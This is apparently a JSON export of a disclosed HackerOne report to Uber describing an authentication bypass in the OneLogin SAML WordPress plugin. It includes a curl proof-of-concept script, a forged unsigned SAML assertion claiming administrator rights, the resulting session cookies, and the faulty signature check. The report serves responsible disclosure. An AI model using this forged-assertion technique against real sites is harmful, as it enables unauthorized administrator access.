{"id":136169,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzYxNjk=","url":"https://hackerone.com/reports/136169","title":"OneLogin authentication bypass on WordPress sites","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-04T07:29:37.558Z","submitted_at":"2016-05-04T07:29:37.558Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jouko","url":"/jouko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-06T09:54:01.182Z","bug_reporter_agreed_on_going_public_at":"2016-05-07T09:53:44.840Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"First, I'm sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites).\n\n#Overview#\nThe *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication.\n\nThe attacker can supply a username, email adress, name, and a role. If the username doesn't already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested).\n\nIt looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as \"administrator\", or the email address or username of an existing administrator.\n\n#PoC#\nI tried this on two sites. On eng.uber.com I couldn't guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a \"subscriber\" level account. On newsroom.uber.com the role name apparently was simply \"administrator\" so I got that privilege on the system. Some other plugin settings may affect this behavior too.\n\n#Reproducing#\nAn example shell script:\n~~~~ sh\n#!/bin/sh\nxml=`base64 response.xml`\ncurl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' \\\n    --data \"RelayState=/wp-login.php\" --data-urlencode \"SAMLResponse=$xml\"\n~~~~\nThe required file \"response.xml\" containing a SAML response:\n~~~~ xml\n\u003csamlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"R0bdb6f33ef84425aa2782eab4483792762f297df\" Version=\"2.0\" IssueInstant=\"2016-05-04T01:37:34Z\" Destination=\"\" InResponseTo=\"ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\"\u003e\n\u003csamlp:Status\u003e\u003csamlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/\u003e\u003c/samlp:Status\u003e\n\u003csaml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfxb75932c2-2e44-d18d-224b-354849a292af\" IssueInstant=\"2016-05-04T01:37:34Z\"\u003e\n\u003csaml:Subject\u003e\n\u003csaml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\"\u003ejouko@iki.fi\u003c/saml:NameID\u003e\n\u003csaml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"\u003e\n\u003csaml:SubjectConfirmationData NotOnOrAfter=\"2016-05-04T01:40:34Z\" Recipient=\"\" InResponseTo=\"ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\"/\u003e\n\u003c/saml:SubjectConfirmation\u003e\n\u003c/saml:Subject\u003e\n\u003csaml:Conditions NotBefore=\"2016-05-04T01:34:34Z\" NotOnOrAfter=\"2016-05-04T01:40:34Z\"\u003e\n\u003csaml:AudienceRestriction\u003e\n\u003csaml:Audience\u003ephp-saml\u003c/saml:Audience\u003e\n\u003c/saml:AudienceRestriction\u003e\n\u003c/saml:Conditions\u003e\n\u003csaml:AuthnStatement AuthnInstant=\"2016-05-04T01:37:33Z\" SessionNotOnOrAfter=\"2016-05-05T01:37:34Z\" SessionIndex=\"_b340ffa0-f3c6-0133-3483-02a5406d9a2f\"\u003e\n\u003csaml:AuthnContext\u003e\n\u003csaml:AuthnContextClassRef\u003e\nurn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\n\u003c/saml:AuthnContextClassRef\u003e\n\u003c/saml:AuthnContext\u003e\n\u003c/saml:AuthnStatement\u003e\n\u003csaml:AttributeStatement\u003e\n\u003csaml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.Username\"\u003e\n\u003csaml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"\u003eadmin\u003c/saml:AttributeValue\u003e\n\u003c/saml:Attribute\u003e\n\u003csaml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.LastName\"\u003e\n\u003csaml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"\u003ePynnonen\u003c/saml:AttributeValue\u003e\n\u003c/saml:Attribute\u003e\n\u003csaml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.FirstName\"\u003e\n\u003csaml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"\u003eJouko\u003c/saml:AttributeValue\u003e\n\u003c/saml:Attribute\u003e\n\u003csaml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"User.email\"\u003e\n\u003csaml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"\u003enoreply@uber.com\u003c/saml:AttributeValue\u003e\n\u003c/saml:Attribute\u003e\n\u003csaml:Attribute NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\" Name=\"memberOf\"\u003e\n\u003csaml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"\u003eAdministrator\u003c/saml:AttributeValue\u003e\n\u003c/saml:Attribute\u003e\n\u003c/saml:AttributeStatement\u003e\n\u003c/saml:Assertion\u003e\n\u003c/samlp:Response\u003e\n\n~~~~\n\nRunning the script sends an HTTP request containing a faked SAML response to WordPress. The plugin accepts it, sets authentication cookies and redirects the user to the front page.\n\nSample WP response:\n~~~~\nHTTP/1.1 302 Found\nServer: nginx\nDate: Wed, 04 May 2016 06:24:22 GMT\nContent-Type: text/html\nContent-Length: 20\nConnection: keep-alive\nKeep-Alive: timeout=20\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly\nSet-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly\nSet-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nLocation: https://newsroom.uber.com\n~~~~\nAfter this you can e.g. copy the cookies to a web browser to use the website as a logged-in user.\n\n#Details#\nThe WordPress plugin fails to adequately validate the SAML response. The bug is in the file *wp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php*, function *isValid()*. The cryptographical signature check is inside a code block that is executed only if the XML response contains a \u003cds:Signature /\u003e tag.\n~~~~ php\n   if (!empty($signedElements)) {\n       // verify signature\n   }\n~~~~\nIf the tag is left out, then the plugin accepts any \"authentication OK\" response without checking if it's coming from a trusted source.\n\nThe above XML may have some unnecessary data. I just took a valid OneLogin response and removed the \u003cds:Signature /\u003e tag, plus some others.\n\n","vulnerability_information_html":"\u003cp\u003eFirst, I\u0026#39;m sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites).\u003c/p\u003e\n\n\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\n\u003cp\u003eThe *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication.\u003c/p\u003e\n\n\u003cp\u003eThe attacker can supply a username, email adress, name, and a role. If the username doesn\u0026#39;t already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested).\u003c/p\u003e\n\n\u003cp\u003eIt looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as \u0026quot;administrator\u0026quot;, or the email address or username of an existing administrator.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003cp\u003eI tried this on two sites. On eng.uber.com I couldn\u0026#39;t guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a \u0026quot;subscriber\u0026quot; level account. On newsroom.uber.com the role name apparently was simply \u0026quot;administrator\u0026quot; so I got that privilege on the system. Some other plugin settings may affect this behavior too.\u003c/p\u003e\n\n\u003ch1 id=\"reproducing\"\u003eReproducing\u003c/h1\u003e\n\n\u003cp\u003eAn example shell script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/sh\u003c/span\u003e\n\u003cspan class=\"nv\"\u003exml\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003ebase64 \u003c/span\u003eresponse.xml\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\ncurl \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;RelayState=/wp-login.php\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data-urlencode\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;SAMLResponse=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$xml\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe required file \u0026quot;response.xml\u0026quot; containing a SAML response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;samlp:Response\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:saml=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:assertion\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:samlp=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:protocol\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;R0bdb6f33ef84425aa2782eab4483792762f297df\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eVersion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2.0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eIssueInstant=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-04T01:37:34Z\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eDestination=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eInResponseTo=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;samlp:Status\u0026gt;\u0026lt;samlp:StatusCode\u003c/span\u003e \u003cspan class=\"na\"\u003eValue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:status:Success\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u0026lt;/samlp:Status\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Assertion\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:saml=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:assertion\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xs=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eVersion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2.0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;pfxb75932c2-2e44-d18d-224b-354849a292af\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eIssueInstant=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-04T01:37:34Z\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Subject\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:NameID\u003c/span\u003e \u003cspan class=\"na\"\u003eFormat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ejouko@iki.fi\u003cspan class=\"nt\"\u003e\u0026lt;/saml:NameID\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:SubjectConfirmation\u003c/span\u003e \u003cspan class=\"na\"\u003eMethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:cm:bearer\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:SubjectConfirmationData\u003c/span\u003e \u003cspan class=\"na\"\u003eNotOnOrAfter=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-04T01:40:34Z\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eRecipient=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eInResponseTo=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:SubjectConfirmation\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Subject\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Conditions\u003c/span\u003e \u003cspan class=\"na\"\u003eNotBefore=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-04T01:34:34Z\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eNotOnOrAfter=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-04T01:40:34Z\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AudienceRestriction\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Audience\u0026gt;\u003c/span\u003ephp-saml\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Audience\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AudienceRestriction\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Conditions\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AuthnStatement\u003c/span\u003e \u003cspan class=\"na\"\u003eAuthnInstant=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-04T01:37:33Z\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eSessionNotOnOrAfter=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2016-05-05T01:37:34Z\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eSessionIndex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;_b340ffa0-f3c6-0133-3483-02a5406d9a2f\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AuthnContext\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AuthnContextClassRef\u0026gt;\u003c/span\u003e\nurn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AuthnContextClassRef\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AuthnContext\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AuthnStatement\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AttributeStatement\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Attribute\u003c/span\u003e \u003cspan class=\"na\"\u003eNameFormat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eName=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;User.Username\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AttributeValue\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exsi:type=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xs:string\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eadmin\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AttributeValue\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Attribute\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Attribute\u003c/span\u003e \u003cspan class=\"na\"\u003eNameFormat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eName=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;User.LastName\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AttributeValue\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exsi:type=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xs:string\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003ePynnonen\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AttributeValue\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Attribute\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Attribute\u003c/span\u003e \u003cspan class=\"na\"\u003eNameFormat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eName=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;User.FirstName\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AttributeValue\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exsi:type=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xs:string\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eJouko\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AttributeValue\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Attribute\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Attribute\u003c/span\u003e \u003cspan class=\"na\"\u003eNameFormat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eName=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;User.email\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AttributeValue\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exsi:type=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xs:string\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003enoreply@uber.com\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AttributeValue\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Attribute\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:Attribute\u003c/span\u003e \u003cspan class=\"na\"\u003eNameFormat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eName=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;memberOf\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;saml:AttributeValue\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exsi:type=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;xs:string\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eAdministrator\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AttributeValue\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Attribute\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:AttributeStatement\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/saml:Assertion\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/samlp:Response\u0026gt;\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRunning the script sends an HTTP request containing a faked SAML response to WordPress. The plugin accepts it, sets authentication cookies and redirects the user to the front page.\u003c/p\u003e\n\n\u003cp\u003eSample WP response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nServer: nginx\nDate: Wed, 04 May 2016 06:24:22 GMT\nContent-Type: text/html\nContent-Length: 20\nConnection: keep-alive\nKeep-Alive: timeout=20\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/wp-content/plugins; secure; httponly\nSet-Cookie: wordpress_sec_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ceb93b7768e2ebb6625b58e4bc7c2c4e63cce7651846e1b834d649258f2b9a9cd; path=/; secure; httponly\nSet-Cookie: wordpress_logged_in_1215024994609a88de6286519d141a3d=trojmiasto%7C1462515862%7CYE7KrDOk28mEiwgNKVQZrbhOcj8NfNTzAhachcDGnHl%7Ce566c71dac745da6f17cd52c7c3c2d3f0cc6baec81b4d79d97fb153896e0acee; path=/; secure; httponly\nSet-Cookie: saml_login=1; expires=Thu, 04-May-2017 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_secure_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nSet-Cookie: wordpress_user_sw_olduser_1215024994609a88de6286519d141a3d=+; expires=Tue, 05-May-2015 06:24:22 GMT; path=/\nLocation: https://newsroom.uber.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter this you can e.g. copy the cookies to a web browser to use the website as a logged-in user.\u003c/p\u003e\n\n\u003ch1 id=\"details\"\u003eDetails\u003c/h1\u003e\n\n\u003cp\u003eThe WordPress plugin fails to adequately validate the SAML response. The bug is in the file \u003cem\u003ewp-content/plugins/onelogin-saml-sso/php/lib/Saml2/Response.php\u003c/em\u003e, function \u003cem\u003eisValid()\u003c/em\u003e. The cryptographical signature check is inside a code block that is executed only if the XML response contains a \u0026lt;ds:Signature /\u0026gt; tag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e   \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$signedElements\u003c/span\u003e\u003cspan 